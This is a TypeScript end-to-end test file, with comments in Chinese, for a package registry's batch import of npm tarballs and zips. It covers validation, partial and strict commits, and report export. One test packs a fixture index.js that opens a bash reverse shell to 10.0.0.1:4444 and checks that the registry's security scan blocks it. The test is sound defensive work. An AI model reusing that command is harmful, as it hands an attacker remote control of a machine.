import request from 'supertest';
import { ADMIN, createTestApp, type TestContext } from './app-factory';
import { makeNpmTarball, makeZip } from './fixtures';

describe('A1 批量导入与全量校验（e2e）', () => {
  let ctx: TestContext;

  beforeAll(async () => {
    ctx = await createTestApp('import');
  });

  afterAll(async () => {
    await ctx.close();
  });

  it('上传包自动识别 → 全量校验 → partial 入库 → 报告下载', async () => {
    // 通用源：engines 超出默认 Node target 只告警不拦截，两个包都应入库
    const good = await makeNpmTarball('e2e-lib', '1.0.0', {
      engines: { node: '>=18' },
      description: '批量导入测试包',
    });
    const incompatible = await makeNpmTarball('e2e-lib-bad', '1.0.0', { engines: { node: '>=99' } });

    const created = await request(ctx.baseUrl)
      .post('/api/v1/import-batches/auto')
      .auth(ADMIN.username, ADMIN.password)
      .attach('files', good, 'e2e-lib-1.0.0.tgz')
      .attach('files', incompatible, 'e2e-lib-bad-1.0.0.tgz')
      .expect(201);
    const batchId = created.body.data.batchId as string;
    expect(batchId).toBeTruthy();
    expect(created.body.data.preview.total).toBe(2);
    expect(created.body.data.preview.newCount).toBe(2);
    expect(created.body.data.failed).toEqual([]);

    const validated = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/validate`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(201);
    expect(validated.body.data.stats.valid).toBe(2);
    expect(validated.body.data.stats.invalid).toBe(0);

    const batch = await request(ctx.baseUrl)
      .get(`/api/v1/import-batches/${batchId}`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    const items = batch.body.data.items as { name: string; status: string; reasonCodes: string[] }[];
    expect(items.map((item) => item.status)).toEqual(['VALID', 'VALID']);
    // engines 不兼容仅作提示：reasonCodes 会记录该 code，但条目仍是 VALID
    expect(items[1].reasonCodes).toContain('PKG_RUNTIME_INCOMPATIBLE');

    const committed = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/commit`)
      .auth(ADMIN.username, ADMIN.password)
      .send({ mode: 'partial' })
      .expect(201);
    expect(committed.body.data.stats).toMatchObject({ committed: 2, skipped: 0, failed: 0 });

    const report = await request(ctx.baseUrl)
      .get(`/api/v1/import-batches/${batchId}/report?format=csv`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(report.headers['content-type']).toContain('text/csv');
    expect(report.text).toContain('itemNo,ecosystem,name,version,status');
    expect(report.text).toContain('e2e-lib-bad');

    const packages = await request(ctx.baseUrl)
      .get('/api/v1/packages?q=e2e-lib')
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    const names = (packages.body.data.items as { name: string }[]).map((item) => item.name);
    expect(names).toContain('e2e-lib');
    expect(names).toContain('e2e-lib-bad');
  });

  it('批量 8 个包全部通过校验并完成入库', async () => {
    const names = Array.from({ length: 8 }, (_, index) => `e2e-batch-${index}`);
    let upload = request(ctx.baseUrl)
      .post('/api/v1/import-batches/auto')
      .auth(ADMIN.username, ADMIN.password);
    for (const name of names) {
      upload = upload.attach('files', await makeNpmTarball(name, '1.0.0'), `${name}-1.0.0.tgz`);
    }
    const created = await upload.expect(201);
    const batchId = created.body.data.batchId as string;
    expect(created.body.data.preview.total).toBe(8);
    expect(created.body.data.failed).toEqual([]);

    const validated = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/validate`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(201);
    expect(validated.body.data.stats).toMatchObject({ valid: 8, invalid: 0, securityBlocked: 0 });

    const committed = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/commit`)
      .auth(ADMIN.username, ADMIN.password)
      .send({ mode: 'partial' })
      .expect(201);
    expect(committed.body.data.stats).toMatchObject({ committed: 8, failed: 0 });
  });

  it('strict 模式遇到失败项时中止入库', async () => {
    // 用重复版本制造真实结构 INVALID（engines 不兼容已降为通用源提示，不再拦截）
    const existing = await makeNpmTarball('e2e-strict', '1.0.0');
    await request(ctx.baseUrl)
      .put('/npm/e2e-strict')
      .auth(ADMIN.username, ctx.npmTokens[ADMIN.username])
      .send({
        name: 'e2e-strict',
        versions: { '1.0.0': { version: '1.0.0' } },
        _attachments: { 'e2e-strict-1.0.0.tgz': { data: existing.toString('base64') } },
      })
      .expect(201);
    const bad = await makeNpmTarball('e2e-strict', '1.0.0');

    const created = await request(ctx.baseUrl)
      .post('/api/v1/import-batches/auto')
      .auth(ADMIN.username, ADMIN.password)
      .attach('files', bad, 'e2e-strict-1.0.0.tgz')
      .expect(201);
    const batchId = created.body.data.batchId as string;

    const validated = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/validate`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(201);
    expect(validated.body.data.stats.invalid).toBe(1);

    const blocked = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/commit`)
      .auth(ADMIN.username, ADMIN.password)
      .send({ mode: 'strict' })
      .expect(409);
    expect(blocked.body.code).toBe('BATCH_HAS_BLOCKING_ITEMS');
  });

  it('strict 模式下安全拦截在写入前生效，批次零入库', async () => {
    // package.json 本身合法（识别阶段通过），恶意代码在文件层被安全扫描拦截
    const malicious = await makeNpmTarball(
      'e2e-sec-batch',
      '1.0.0',
      {},
      {
        'index.js':
          "const { exec } = require('child_process');\nexec('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1');\n",
      },
    );

    const created = await request(ctx.baseUrl)
      .post('/api/v1/import-batches/auto')
      .auth(ADMIN.username, ADMIN.password)
      .attach('files', malicious, 'e2e-sec-batch-1.0.0.tgz')
      .expect(201);
    const batchId = created.body.data.batchId as string;

    const validated = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/validate`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(201);
    expect(validated.body.data.stats.securityBlocked).toBe(1);
    expect(validated.body.data.stats.invalid).toBe(1);

    const batch = await request(ctx.baseUrl)
      .get(`/api/v1/import-batches/${batchId}`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(batch.body.data.items[0].status).toBe('INVALID');
    expect(batch.body.data.items[0].reasonCodes).toContain('SEC_BLOCKED');

    const blocked = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/commit`)
      .auth(ADMIN.username, ADMIN.password)
      .send({ mode: 'strict' })
      .expect(409);
    expect(blocked.body.code).toBe('BATCH_HAS_BLOCKING_ITEMS');

    const packages = await request(ctx.baseUrl)
      .get('/api/v1/packages?q=e2e-sec-batch')
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(packages.body.data.total).toBe(0);
  });

  it('识别失败的单个文件进失败明细，不影响同批其它包入库', async () => {
    // 文件名故意与包内声明不一致：身份必须来自 package.json，而不是文件名
    const dsh = { bundle: { patch: './cordis.patch.yml' } };
    const tgz = await makeNpmTarball('e2e-auto-lib', '1.2.3', { description: '免清单导入测试包', dsh });

    const created = await request(ctx.baseUrl)
      .post('/api/v1/import-batches/auto')
      .auth(ADMIN.username, ADMIN.password)
      .attach('files', tgz, 'renamed-package.tgz')
      .attach('files', Buffer.from('not a package'), 'readme.txt')
      .expect(201);

    expect(created.body.data.preview.total).toBe(1);
    expect(created.body.data.preview.byEcosystem).toEqual({ npm: 1 });
    expect(created.body.data.failed).toHaveLength(1);
    expect(created.body.data.failed[0].filename).toBe('readme.txt');

    const batchId = created.body.data.batchId as string;
    const validated = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/validate`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(201);
    expect(validated.body.data.stats.valid).toBe(1);

    const batch = await request(ctx.baseUrl)
      .get(`/api/v1/import-batches/${batchId}`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(batch.body.data.items[0].name).toBe('e2e-auto-lib');
    expect(batch.body.data.items[0].version).toBe('1.2.3');

    const committed = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/commit`)
      .auth(ADMIN.username, ADMIN.password)
      .send({ mode: 'partial' })
      .expect(201);
    expect(committed.body.data.stats.committed).toBe(1);

    // 批量导入从 tarball 读取 package.json，dsh 声明同样要透传到 packument
    const packument = await request(ctx.baseUrl).get('/npm/e2e-auto-lib').expect(200);
    expect(packument.body.dsh).toEqual(dsh);
    expect(packument.body.versions['1.2.3'].dsh).toEqual(dsh);
  });

  it('zip 压缩包自动解压：子目录有效、无关文件与嵌套 zip 进失败明细', async () => {
    const a = await makeNpmTarball('e2e-zip-a', '1.0.0');
    const b = await makeNpmTarball('e2e-zip-b', '1.0.0');
    const inner = makeZip({ 'inner-e2e-zip-c-1.0.0.tgz': await makeNpmTarball('e2e-zip-c', '1.0.0') });
    const zipBuf = makeZip({
      'e2e-zip-a-1.0.0.tgz': a,
      // 子目录条目取 basename 识别
      'nested/e2e-zip-b-1.0.0.tgz': b,
      'readme.txt': Buffer.from('not a package'),
      'inner.zip': inner,
    });

    const created = await request(ctx.baseUrl)
      .post('/api/v1/import-batches/auto')
      .auth(ADMIN.username, ADMIN.password)
      .attach('files', zipBuf, 'bundle.zip')
      .expect(201);
    expect(created.body.data.preview.total).toBe(2);
    expect(created.body.data.preview.newCount).toBe(2);
    const failed = created.body.data.failed as { filename: string; reason: string }[];
    expect(failed.map((f) => f.filename).sort()).toEqual(['inner.zip', 'readme.txt']);
    expect(failed.find((f) => f.filename === 'inner.zip')?.reason).toContain('嵌套');

    const batchId = created.body.data.batchId as string;
    const validated = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/validate`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(201);
    expect(validated.body.data.stats.valid).toBe(2);

    const batch = await request(ctx.baseUrl)
      .get(`/api/v1/import-batches/${batchId}`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    const names = (batch.body.data.items as { name: string }[]).map((item) => item.name).sort();
    expect(names).toEqual(['e2e-zip-a', 'e2e-zip-b']);

    const committed = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/commit`)
      .auth(ADMIN.username, ADMIN.password)
      .send({ mode: 'partial' })
      .expect(201);
    expect(committed.body.data.stats.committed).toBe(2);
  });

  it('依赖版本与已入库集合不兼容仍可入库，依赖声明原样透传给下游解析', async () => {
    // 第一步：先入库一个「旧版本」依赖包
    const oldDep = await makeNpmTarball('e2e-compat-dep', '1.0.0', { engines: { node: '>=18' } });
    const first = await request(ctx.baseUrl)
      .post('/api/v1/import-batches/auto')
      .auth(ADMIN.username, ADMIN.password)
      .attach('files', oldDep, 'e2e-compat-dep-1.0.0.tgz')
      .expect(201);
    const firstId = first.body.data.batchId as string;
    await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${firstId}/validate`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(201);
    await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${firstId}/commit`)
      .auth(ADMIN.username, ADMIN.password)
      .send({ mode: 'partial' })
      .expect(201);

    // 第二步：消费方声明 ^2.0.0，库里只有 1.0.0；另有一个完全没导入的依赖
    // 旧逻辑会判 PKG_DEP_INCOMPATIBLE(error) → INVALID → partial 提交时被跳过
    const dependencies = { 'e2e-compat-dep': '^2.0.0', 'never-imported-dep': '^1.0.0' };
    const consumer = await makeNpmTarball('e2e-compat-consumer', '1.0.0', {
      engines: { node: '>=18' },
      dependencies,
      peerDependencies: { 'e2e-compat-dep': '^2.0.0' },
    });
    const created = await request(ctx.baseUrl)
      .post('/api/v1/import-batches/auto')
      .auth(ADMIN.username, ADMIN.password)
      .attach('files', consumer, 'e2e-compat-consumer-1.0.0.tgz')
      .expect(201);
    const batchId = created.body.data.batchId as string;

    const validated = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/validate`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(201);
    expect(validated.body.data.stats).toMatchObject({ valid: 1, invalid: 0 });

    const batch = await request(ctx.baseUrl)
      .get(`/api/v1/import-batches/${batchId}`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    expect(batch.body.data.items[0].status).toBe('VALID');
    expect(batch.body.data.items[0].reasonCodes).not.toContain('PKG_DEP_INCOMPATIBLE');
    expect(batch.body.data.items[0].reasonCodes).not.toContain('PKG_DEP_UNRESOLVED');

    const committed = await request(ctx.baseUrl)
      .post(`/api/v1/import-batches/${batchId}/commit`)
      .auth(ADMIN.username, ADMIN.password)
      .send({ mode: 'partial' })
      .expect(201);
    expect(committed.body.data.stats).toMatchObject({ committed: 1, skipped: 0, failed: 0 });

    // 依赖声明仍要出现在 packument 里，下游 npm 客户端才能按需解析版本
    const packument = await request(ctx.baseUrl).get('/npm/e2e-compat-consumer').expect(200);
    expect(packument.body.versions['1.0.0'].dependencies).toEqual(dependencies);
  });
});
